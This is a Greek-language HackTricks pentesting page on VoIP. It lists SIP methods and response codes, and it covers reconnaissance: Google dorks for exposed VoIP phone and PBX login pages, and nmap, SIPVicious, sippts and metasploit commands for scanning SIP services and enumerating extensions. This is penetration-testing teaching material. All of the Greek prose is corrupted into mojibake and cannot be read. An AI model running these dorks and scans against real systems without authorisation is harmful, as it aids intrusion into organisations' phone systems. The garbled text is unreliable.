# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## VoIP Basic Information

Î“Î¹Î± Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï„Î¿ VoIP, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Basic Messages
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Response Codes

**1xxâ€”Î ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î­Ï‚ Î‘Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”Î•Ï€Î¹Ï„Ï…Ï‡ÎµÎ¯Ï‚ Î‘Î½Ï„Î¹Î´ÏÎ¬ÏƒÎµÎ¹Ï‚**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”Î‘Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Î‘Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”Î‘Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Î‘Ï€Î¿Ï„Ï…Ï‡Î¯Î±Ï‚ Î ÎµÎ»Î¬Ï„Î·**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”Î‘Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Î‘Ï€Î¿Ï„Ï…Ï‡Î¯Î±Ï‚ Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”Î Î±Î³ÎºÏŒÏƒÎ¼Î¹ÎµÏ‚ Î‘Ï€Î¿Ï„Ï…Ï‡Î¯ÎµÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Î¹**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Î¤Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÎ¿Î¯ Î‘ÏÎ¹Î¸Î¼Î¿Î¯

ÎˆÎ½Î± Î±Ï€ÏŒ Ï„Î± Ï€ÏÏÏ„Î± Î²Î®Î¼Î±Ï„Î± Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î¼Î¹Î± Red Team ÎµÎ¯Î½Î±Î¹ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Ï…Ï‚ Ï„Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÎ¿ÏÏ‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚ Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÎ¹ Î¼Îµ Ï„Î·Î½ ÎµÏ„Î±Î¹ÏÎµÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î± OSINT, Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ„Î¿ Google Î® scraping Ï„Ï‰Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Ï‰Î½.

ÎœÏŒÎ»Î¹Ï‚ Î­Ï‡ÎµÏ„Îµ Ï„Î¿Ï…Ï‚ Ï„Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÎ¿ÏÏ‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ­Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï€Î¬ÏÎ¿Ï‡Î¿:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Î“Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Î±Î½ Î¿ Ï€Î¬ÏÎ¿Ï‡Î¿Ï‚ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ VoIP, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î±Î½ Î· ÎµÏ„Î±Î¹ÏÎµÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ VoIP... Î•Ï€Î¹Ï€Î»Î­Î¿Î½, ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ ÏŒÏ„Î¹ Î· ÎµÏ„Î±Î¹ÏÎµÎ¯Î± Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Ï€ÏÎ¿ÏƒÎ»Î¬Î²ÎµÎ¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ VoIP Î±Î»Î»Î¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ¬ÏÏ„ÎµÏ‚ PSTN Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹ Ï„Î¿ Î´Î¹ÎºÏŒ Ï„Î·Ï‚ VoIP PBX Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ±Î´Î¿ÏƒÎ¹Î±ÎºÏŒ Î´Î¯ÎºÏ„Ï…Î¿ Ï„Î·Î»ÎµÏ†Ï‰Î½Î¯Î±Ï‚.

Î ÏÎ¬Î³Î¼Î±Ï„Î± ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½ÎµÏ‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Î¼Î¿Ï…ÏƒÎ¹ÎºÎ®Ï‚ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Ï…Î½ ÏŒÏ„Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

ÎŸÏ€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î· OSINT Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Ï€Î¿Ï… Î²Î¿Î·Î¸Î¬ ÏƒÏ„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Ï„Î¿Ï… Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï VoIP Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¸Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î· Î³Î¹Î± Î¼Î¹Î± Red Team.

### Î”Î¹ÎºÏ„Ï…Î±ÎºÎ® Î‘ÏÎ¯Î¸Î¼Î·ÏƒÎ·

* **`nmap`** ÎµÎ¯Î½Î±Î¹ Î¹ÎºÎ±Î½ÏŒ Î½Î± ÏƒÎ±ÏÏÏƒÎµÎ¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ UDP, Î±Î»Î»Î¬ Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Î±ÏÎ¹Î¸Î¼Î¿Ï Ï„Ï‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ UDP Ï€Î¿Ï… ÏƒÎ±ÏÏÎ½Î¿Î½Ï„Î±Î¹, ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Î±ÏÎ³ÏŒ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Î±ÎºÏÎ¹Î²Î­Ï‚ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** Î±Ï€ÏŒ Ï„Î¿ SIPVicious (`sudo apt install sipvicious`): Î˜Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Ï„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ SIP ÏƒÏ„Î¿ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½Ï…ÏŒÎ¼ÎµÎ½Î¿ Î´Î¯ÎºÏ„Ï…Î¿.
* `svmap` ÎµÎ¯Î½Î±Î¹ **ÎµÏÎºÎ¿Î»Î¿ Î½Î± Î¼Ï€Î»Î¿ÎºÎ±ÏÎ¹ÏƒÏ„ÎµÎ¯** ÎµÏ€ÎµÎ¹Î´Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿Î½ User-Agent `friendly-scanner`, Î±Î»Î»Î¬ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î±Ï€ÏŒ Ï„Î¿ `/usr/share/sipvicious/sipvicious` ÎºÎ±Î¹ Î½Î± Ï„Î¿Î½ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î— ÏƒÎ¬ÏÏ‰ÏƒÎ· SIPPTS ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Ï€Î¿Î»Ï Î³ÏÎ®Î³Î¿ÏÎ¿Ï‚ ÏƒÎ±ÏÏ‰Ï„Î®Ï‚ Î³Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ SIP Î¼Î­ÏƒÏ‰ UDP, TCP Î® TLS. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚ Î½Î®Î¼Î±Ï„Î± ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±ÏÏÏƒÎµÎ¹ Î¼ÎµÎ³Î¬Î»ÎµÏ‚ Ï€ÎµÏÎ¹Î¿Ï‡Î­Ï‚ Î´Î¹ÎºÏ„ÏÏ‰Î½. Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏÎºÎ¿Î»Î· Î­Î½Î´ÎµÎ¹Î¾Î· Î¼Î¹Î±Ï‚ Ï€ÎµÏÎ¹Î¿Ï‡Î®Ï‚ Î¸Ï…ÏÏÎ½, Ï„Î· ÏƒÎ¬ÏÏ‰ÏƒÎ· Ï„ÏŒÏƒÎ¿ TCP ÏŒÏƒÎ¿ ÎºÎ±Î¹ UDP, Ï„Î· Ï‡ÏÎ®ÏƒÎ· Î¬Î»Î»Î·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… (ÎºÎ±Ï„Î¬ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ OPTIONS) ÎºÎ±Î¹ Ï„Î·Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® User-Agent (ÎºÎ±Î¹ Î¬Î»Î»Î±).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Extra Network Enumeration

ÎŸ PBX Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÏŒÏ€Ï‰Ï‚:

* **69/UDP (TFTP)**: Î•Î½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚ Ï…Î»Î¹ÎºÎ¿Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï
* **80 (HTTP) / 443 (HTTPS)**: Î“Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ Î±Ï€ÏŒ Ï„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿
* **389 (LDAP)**: Î•Î½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î³Î¹Î± Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½
* **3306 (MySQL)**: Î’Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ MySQL
* **5038 (Manager)**: Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… Asterisk Î±Ï€ÏŒ Î¬Î»Î»ÎµÏ‚ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼ÎµÏ‚
* **5222 (XMPP)**: ÎœÎ·Î½ÏÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Jabber
* ÎšÎ±Î¹ Î¬Î»Î»ÎµÏ‚...

### Methods Enumeration

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **Ï€Î¿Î¹Î¿Î¹ Î¼Î­Î¸Î¿Î´Î¿Î¹ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Î¹** Î³Î¹Î± Ï‡ÏÎ®ÏƒÎ· ÏƒÏ„Î¿ PBX Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `SIPPTS enumerate` Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Î‘Î½Î¬Î»Ï…ÏƒÎ· Î±Ï€Î±Î½Ï„Î®ÏƒÎµÏ‰Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®

Î•Î¯Î½Î±Î¹ Ï€Î¿Î»Ï ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± Î±Î½Î±Î»ÏÎ¿Ï…Î¼Îµ Ï„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Ï€Î¿Ï… Î¼Î±Ï‚ ÏƒÏ„Î­Î»Î½ÎµÎ¹ Ï€Î¯ÏƒÏ‰ Î­Î½Î±Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚, Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ Ï„Î¿Ï… Î¼Î·Î½ÏÎ¼Î±Ï„Î¿Ï‚ ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Ï€Î¿Ï… ÏƒÏ„Î­Î»Î½Î¿Ï…Î¼Îµ. ÎœÎµ Ï„Î¿ `SIPPTS send` Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts) Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î¼Îµ ÎµÎ¾Î±Ï„Î¿Î¼Î¹ÎºÎµÏ…Î¼Î­Î½Î± Î¼Î·Î½ÏÎ¼Î±Ï„Î±, Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿Î¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚, ÎºÎ±Î¹ Î½Î± Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Î½ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ websockets. ÎœÎµ Ï„Î¿ `SIPPTS wssend` Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts) Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»Î¿Ï…Î¼Îµ ÎµÎ¾Î±Ï„Î¿Î¼Î¹ÎºÎµÏ…Î¼Î­Î½Î± Î¼Î·Î½ÏÎ¼Î±Ï„Î± WS.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

Extensions ÏƒÎµ Î­Î½Î± PBX (Private Branch Exchange) ÏƒÏÏƒÏ„Î·Î¼Î± Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Ï…Ï‚ **Î¼Î¿Î½Î±Î´Î¹ÎºÎ¿ÏÏ‚ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¿ÏÏ‚ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÎ¿ÏÏ‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚ Ï€Î¿Ï… Î±Ï€Î¿Î´Î¯Î´Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½ÎµÏ‚** Ï„Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÎ­Ï‚ Î³ÏÎ±Î¼Î¼Î­Ï‚, ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ Î® Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎ½Ï„ÏŒÏ‚ ÎµÎ½ÏŒÏ‚ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿Ï Î® ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·ÏƒÎ·Ï‚. ÎŸÎ¹ extensions ÎºÎ±Î¸Î¹ÏƒÏ„Î¿ÏÎ½ Î´Ï…Î½Î±Ï„Î® Ï„Î·Î½ **Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ® Î´ÏÎ¿Î¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎºÎ»Î®ÏƒÎµÏ‰Î½ ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿Ï**, Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î³Î¹Î± Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½Î¿Ï…Ï‚ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¿ÏÏ‚ Ï„Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÎ¿ÏÏ‚ Î±ÏÎ¹Î¸Î¼Î¿ÏÏ‚ Î³Î¹Î± ÎºÎ¬Î¸Îµ Ï‡ÏÎ®ÏƒÏ„Î· Î® ÏƒÏ…ÏƒÎºÎµÏ…Î®.

* **`svwar`** Î±Ï€ÏŒ Ï„Î¿ SIPVicious (`sudo apt install sipvicious`): `svwar` ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î´Ï‰ÏÎµÎ¬Î½ ÏƒÎ±ÏÏ‰Ï„Î®Ï‚ Ï„Î·Î»ÎµÏ†Ï‰Î½Î¹ÎºÏÎ½ Î³ÏÎ±Î¼Î¼ÏÎ½ SIP PBX. Î£Ï„Î·Î½ Î­Î½Î½Î¿Î¹Î± Ï„Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¿Ï…Ï‚ Ï€Î±ÏÎ±Î´Î¿ÏƒÎ¹Î±ÎºÎ¿ÏÏ‚ wardialers, **Î¼Î±Î½Ï„ÎµÏÎ¿Î½Ï„Î±Ï‚ Î¼Î¹Î± ÏƒÎµÎ¹ÏÎ¬ Î±Ï€ÏŒ extensions Î® Î¼Î¹Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î· Î»Î¯ÏƒÏ„Î± extensions**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** Î±Ï€ÏŒ [**sippts**](https://github.com/Pepelux/sippts)**:** Î¤Î¿ SIPPTS exten Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹ Ï„Î¹Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ ÏƒÎµ Î­Î½Î±Î½ SIP server. Î¤Î¿ Sipexten Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î¼ÎµÎ³Î¬Î»ÎµÏ‚ Ï€ÎµÏÎ¹Î¿Ï‡Î­Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÎºÎ±Î¹ Î¸Ï…ÏÏÎ½.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚/Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î¼Îµ Ï„Î¿ metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
